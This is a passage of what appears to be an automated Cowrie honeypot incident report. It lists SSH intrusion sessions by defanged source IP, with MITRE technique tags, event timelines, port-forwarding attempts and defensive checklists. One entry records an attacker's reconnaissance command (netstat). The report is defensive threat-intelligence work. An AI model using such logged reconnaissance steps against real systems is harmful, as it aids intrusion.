| `2026-08-25 15:21:33` | `cowrie.log.closed` |
| `2026-08-25 15:21:34` | `cowrie.session.params` |
| `2026-08-25 15:21:34` | `cowrie.command.input` |
| `2026-08-25 15:21:35` | `cowrie.session.file_download` |
| `2026-08-25 15:21:35` | `cowrie.log.closed` |
| `2026-08-25 15:22:04` | `cowrie.session.params` |
| `2026-08-25 15:22:04` | `cowrie.command.input` |
| `2026-08-25 15:22:04` | `cowrie.log.closed` |
| `2026-08-25 15:22:05` | `cowrie.session.params` |
| `2026-08-25 15:22:05` | `cowrie.command.input` |
| `2026-08-25 15:22:05` | `cowrie.command.input` |
| `2026-08-25 15:22:05` | `cowrie.command.failed` |
| `2026-08-25 15:22:06` | `cowrie.log.closed` |
| `2026-08-25 15:22:07` | `cowrie.session.params` |
| `2026-08-25 15:22:07` | `cowrie.command.input` |
| `2026-08-25 15:26:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.221.60[.]25` to AbuseIPDB if not already reported
- [ ] Block `58.221.60[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecfc8b25db3c

| Field | Detail |
|---|---|
| **Source IP** | `171.231.179[.]237` |
| **First Seen** | 2026-08-25 15:23 |
| **Last Seen** | 2026-08-25 15:25 |
| **Session Duration** | 141s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 15:23:15` | `cowrie.session.connect` |
| `2026-08-25 15:23:15` | `cowrie.client.version` |
| `2026-08-25 15:23:17` | `cowrie.client.kex` |
| `2026-08-25 15:23:40` | `cowrie.login.success` |
| `2026-08-25 15:25:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.179[.]237` to AbuseIPDB if not already reported
- [ ] Block `171.231.179[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e740718e4bbf

| Field | Detail |
|---|---|
| **Source IP** | `171.231.179[.]237` |
| **First Seen** | 2026-08-25 15:26 |
| **Last Seen** | 2026-08-25 15:26 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 15:26:15` | `cowrie.session.connect` |
| `2026-08-25 15:26:15` | `cowrie.client.version` |
| `2026-08-25 15:26:17` | `cowrie.client.kex` |
| `2026-08-25 15:26:19` | `cowrie.login.success` |
| `2026-08-25 15:26:20` | `cowrie.direct-tcpip.request` |
| `2026-08-25 15:26:21` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 15:26:21` | `cowrie.direct-tcpip.data` |
| `2026-08-25 15:26:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.179[.]237` to AbuseIPDB if not already reported
- [ ] Block `171.231.179[.]237` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9376a42a436f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 15:28 |
| **Last Seen** | 2026-08-25 15:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 15:28:49` | `cowrie.session.connect` |
| `2026-08-25 15:28:49` | `cowrie.client.version` |
| `2026-08-25 15:28:49` | `cowrie.client.kex` |
| `2026-08-25 15:28:50` | `cowrie.login.success` |
| `2026-08-25 15:28:50` | `cowrie.direct-tcpip.request` |
| `2026-08-25 15:28:50` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 15:28:50` | `cowrie.direct-tcpip.data` |
| `2026-08-25 15:28:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-191694670eba

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 15:28 |
| **Last Seen** | 2026-08-25 15:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 15:28:53` | `cowrie.session.connect` |
| `2026-08-25 15:28:53` | `cowrie.client.version` |
| `2026-08-25 15:28:53` | `cowrie.client.kex` |
| `2026-08-25 15:28:54` | `cowrie.login.success` |
| `2026-08-25 15:28:54` | `cowrie.direct-tcpip.request` |
| `2026-08-25 15:28:54` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 15:28:54` | `cowrie.direct-tcpip.data` |
| `2026-08-25 15:28:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5da34eb05d3

| Field | Detail |
|---|---|
| **Source IP** | `116.99.171[.]47` |
| **First Seen** | 2026-08-25 15:33 |
| **Last Seen** | 2026-08-25 15:33 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 15:33:04` | `cowrie.session.connect` |
| `2026-08-25 15:33:04` | `cowrie.client.version` |
| `2026-08-25 15:33:06` | `cowrie.client.kex` |
| `2026-08-25 15:33:21` | `cowrie.login.success` |
| `2026-08-25 15:33:22` | `cowrie.direct-tcpip.request` |
| `2026-08-25 15:33:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 15:33:23` | `cowrie.direct-tcpip.data` |
| `2026-08-25 15:33:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.171[.]47` to AbuseIPDB if not already reported
- [ ] Block `116.99.171[.]47` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2623586f1374

| Field | Detail |
|---|---|
| **Source IP** | `116.99.171[.]47` |
| **First Seen** | 2026-08-25 15:37 |
| **Last Seen** | 2026-08-25 15:38 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 15:37:58` | `cowrie.session.connect` |
| `2026-08-25 15:37:58` | `cowrie.client.version` |
| `2026-08-25 15:38:01` | `cowrie.client.kex` |
| `2026-08-25 15:38:12` | `cowrie.login.success` |
| `2026-08-25 15:38:13` | `cowrie.direct-tcpip.request` |
| `2026-08-25 15:38:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 15:38:15` | `cowrie.direct-tcpip.data` |
| `2026-08-25 15:38:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.171[.]47` to AbuseIPDB if not already reported
- [ ] Block `116.99.171[.]47` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d20c948cf4d5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 15:38 |
| **Last Seen** | 2026-08-25 15:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 15:38:11` | `cowrie.session.connect` |
| `2026-08-25 15:38:11` | `cowrie.client.version` |
| `2026-08-25 15:38:11` | `cowrie.client.kex` |
| `2026-08-25 15:38:12` | `cowrie.login.success` |
| `2026-08-25 15:38:12` | `cowrie.direct-tcpip.request` |
| `2026-08-25 15:38:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 15:38:13` | `cowrie.direct-tcpip.data` |
| `2026-08-25 15:38:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d56b71c7cba5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 15:38 |
| **Last Seen** | 2026-08-25 15:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 15:38:15` | `cowrie.session.connect` |
| `2026-08-25 15:38:15` | `cowrie.client.version` |
| `2026-08-25 15:38:15` | `cowrie.client.kex` |
| `2026-08-25 15:38:16` | `cowrie.login.success` |
| `2026-08-25 15:38:16` | `cowrie.direct-tcpip.request` |
| `2026-08-25 15:38:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 15:38:17` | `cowrie.direct-tcpip.data` |
| `2026-08-25 15:38:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82e32f42124c

| Field | Detail |
|---|---|
| **Source IP** | `116.99.171[.]47` |
| **First Seen** | 2026-08-25 15:47 |
| **Last Seen** | 2026-08-25 15:47 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 15:47:14` | `cowrie.session.connect` |
| `2026-08-25 15:47:14` | `cowrie.client.version` |
| `2026-08-25 15:47:15` | `cowrie.client.kex` |
| `2026-08-25 15:47:36` | `cowrie.login.success` |
| `2026-08-25 15:47:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.171[.]47` to AbuseIPDB if not already reported
- [ ] Block `116.99.171[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b39879e664aa

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 15:47 |
| **Last Seen** | 2026-08-25 15:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 15:47:55` | `cowrie.session.connect` |
| `2026-08-25 15:47:55` | `cowrie.client.version` |
| `2026-08-25 15:47:55` | `cowrie.client.kex` |
| `2026-08-25 15:47:56` | `cowrie.login.success` |
| `2026-08-25 15:47:56` | `cowrie.direct-tcpip.request` |
| `2026-08-25 15:47:57` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 15:47:57` | `cowrie.direct-tcpip.data` |
| `2026-08-25 15:47:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e13aea7ea06

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 15:47 |
| **Last Seen** | 2026-08-25 15:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 15:47:59` | `cowrie.session.connect` |
| `2026-08-25 15:47:59` | `cowrie.client.version` |
| `2026-08-25 15:47:59` | `cowrie.client.kex` |
| `2026-08-25 15:48:00` | `cowrie.login.success` |
| `2026-08-25 15:48:00` | `cowrie.direct-tcpip.request` |
| `2026-08-25 15:48:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 15:48:00` | `cowrie.direct-tcpip.data` |
| `2026-08-25 15:48:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6f95b5e935f

| Field | Detail |
|---|---|
| **Source IP** | `116.99.171[.]47` |
| **First Seen** | 2026-08-25 15:50 |
| **Last Seen** | 2026-08-25 15:50 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 15:50:14` | `cowrie.session.connect` |
| `2026-08-25 15:50:14` | `cowrie.client.version` |
| `2026-08-25 15:50:14` | `cowrie.client.kex` |
| `2026-08-25 15:50:18` | `cowrie.login.success` |
| `2026-08-25 15:50:23` | `cowrie.direct-tcpip.request` |
| `2026-08-25 15:50:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 15:50:23` | `cowrie.direct-tcpip.data` |
| `2026-08-25 15:50:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.171[.]47` to AbuseIPDB if not already reported
- [ ] Block `116.99.171[.]47` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70d46a467c69

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 15:57 |
| **Last Seen** | 2026-08-25 15:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 15:57:22` | `cowrie.session.connect` |
| `2026-08-25 15:57:22` | `cowrie.client.version` |
| `2026-08-25 15:57:23` | `cowrie.client.kex` |
| `2026-08-25 15:57:23` | `cowrie.login.success` |
| `2026-08-25 15:57:24` | `cowrie.direct-tcpip.request` |
| `2026-08-25 15:57:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 15:57:24` | `cowrie.direct-tcpip.data` |
| `2026-08-25 15:57:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59cf4c9a0ac6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 15:57 |
| **Last Seen** | 2026-08-25 15:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 15:57:26` | `cowrie.session.connect` |
| `2026-08-25 15:57:26` | `cowrie.client.version` |
| `2026-08-25 15:57:26` | `cowrie.client.kex` |
| `2026-08-25 15:57:27` | `cowrie.login.success` |
| `2026-08-25 15:57:27` | `cowrie.direct-tcpip.request` |
| `2026-08-25 15:57:28` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 15:57:28` | `cowrie.direct-tcpip.data` |
| `2026-08-25 15:57:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-642056ac2eff

| Field | Detail |
|---|---|
| **Source IP** | `116.99.171[.]47` |
| **First Seen** | 2026-08-25 16:04 |
| **Last Seen** | 2026-08-25 16:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 16:04:23` | `cowrie.session.connect` |
| `2026-08-25 16:04:23` | `cowrie.client.version` |
| `2026-08-25 16:04:23` | `cowrie.client.kex` |
| `2026-08-25 16:04:24` | `cowrie.login.success` |
| `2026-08-25 16:04:25` | `cowrie.direct-tcpip.request` |
| `2026-08-25 16:04:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 16:04:25` | `cowrie.direct-tcpip.data` |
| `2026-08-25 16:04:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.171[.]47` to AbuseIPDB if not already reported
- [ ] Block `116.99.171[.]47` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a706ba626714

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 16:06 |
| **Last Seen** | 2026-08-25 16:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 16:06:47` | `cowrie.session.connect` |
| `2026-08-25 16:06:47` | `cowrie.client.version` |
| `2026-08-25 16:06:47` | `cowrie.client.kex` |
| `2026-08-25 16:06:48` | `cowrie.login.success` |
| `2026-08-25 16:06:48` | `cowrie.direct-tcpip.request` |
| `2026-08-25 16:06:48` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 16:06:48` | `cowrie.direct-tcpip.data` |
| `2026-08-25 16:06:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fa48a2a1395

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 16:06 |
| **Last Seen** | 2026-08-25 16:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 16:06:51` | `cowrie.session.connect` |
| `2026-08-25 16:06:51` | `cowrie.client.version` |
| `2026-08-25 16:06:51` | `cowrie.client.kex` |
| `2026-08-25 16:06:52` | `cowrie.login.success` |
| `2026-08-25 16:06:52` | `cowrie.direct-tcpip.request` |
| `2026-08-25 16:06:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 16:06:53` | `cowrie.direct-tcpip.data` |
| `2026-08-25 16:06:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76cbf3a4c8ab

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 16:16 |
| **Last Seen** | 2026-08-25 16:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 16:16:24` | `cowrie.session.connect` |
| `2026-08-25 16:16:24` | `cowrie.client.version` |
| `2026-08-25 16:16:24` | `cowrie.client.kex` |
| `2026-08-25 16:16:25` | `cowrie.login.success` |
| `2026-08-25 16:16:25` | `cowrie.direct-tcpip.request` |
| `2026-08-25 16:16:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 16:16:25` | `cowrie.direct-tcpip.data` |
| `2026-08-25 16:16:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6731aa41de68

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 16:16 |
| **Last Seen** | 2026-08-25 16:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 16:16:27` | `cowrie.session.connect` |
| `2026-08-25 16:16:27` | `cowrie.client.version` |
| `2026-08-25 16:16:27` | `cowrie.client.kex` |
| `2026-08-25 16:16:28` | `cowrie.login.success` |
| `2026-08-25 16:16:28` | `cowrie.direct-tcpip.request` |
| `2026-08-25 16:16:29` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 16:16:29` | `cowrie.direct-tcpip.data` |
| `2026-08-25 16:16:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5185a0632af

| Field | Detail |
|---|---|
| **Source IP** | `207.46.224[.]87` |
| **First Seen** | 2026-08-25 16:17 |
| **Last Seen** | 2026-08-25 16:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `netstat -tulpn | head -10` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 16:17:53` | `cowrie.session.connect` |
| `2026-08-25 16:17:53` | `cowrie.client.version` |
| `2026-08-25 16:17:53` | `cowrie.client.kex` |
| `2026-08-25 16:17:54` | `cowrie.login.success` |
| `2026-08-25 16:17:55` | `cowrie.session.params` |
| `2026-08-25 16:17:55` | `cowrie.command.input` |
| `2026-08-25 16:17:56` | `cowrie.log.closed` |
| `2026-08-25 16:17:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.46.224[.]87` to AbuseIPDB if not already reported
- [ ] Block `207.46.224[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf49fd859202

| Field | Detail |
|---|---|
| **Source IP** | `165.232.61[.]133` |
| **First Seen** | 2026-08-25 16:19 |
| **Last Seen** | 2026-08-25 16:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 16:19:10` | `cowrie.session.connect` |
| `2026-08-25 16:19:10` | `cowrie.client.version` |
| `2026-08-25 16:19:10` | `cowrie.client.kex` |
| `2026-08-25 16:19:11` | `cowrie.login.success` |
| `2026-08-25 16:19:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.61[.]133` to AbuseIPDB if not already reported
- [ ] Block `165.232.61[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-586a72f6fee3

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-25 16:19 |
| **Last Seen** | 2026-08-25 16:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 16:19:44` | `cowrie.session.connect` |
| `2026-08-25 16:19:44` | `cowrie.client.version` |
| `2026-08-25 16:19:44` | `cowrie.client.kex` |
| `2026-08-25 16:19:44` | `cowrie.login.success` |
| `2026-08-25 16:19:44` | `cowrie.direct-tcpip.request` |
| `2026-08-25 16:19:44` | `cowrie.direct-tcpip.data` |
| `2026-08-25 16:19:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8302655efd2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 16:25 |
| **Last Seen** | 2026-08-25 16:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 16:25:57` | `cowrie.session.connect` |
| `2026-08-25 16:25:57` | `cowrie.client.version` |
| `2026-08-25 16:25:57` | `cowrie.client.kex` |
| `2026-08-25 16:25:58` | `cowrie.login.success` |
| `2026-08-25 16:25:58` | `cowrie.direct-tcpip.request` |
| `2026-08-25 16:25:58` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 16:25:58` | `cowrie.direct-tcpip.data` |
| `2026-08-25 16:25:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
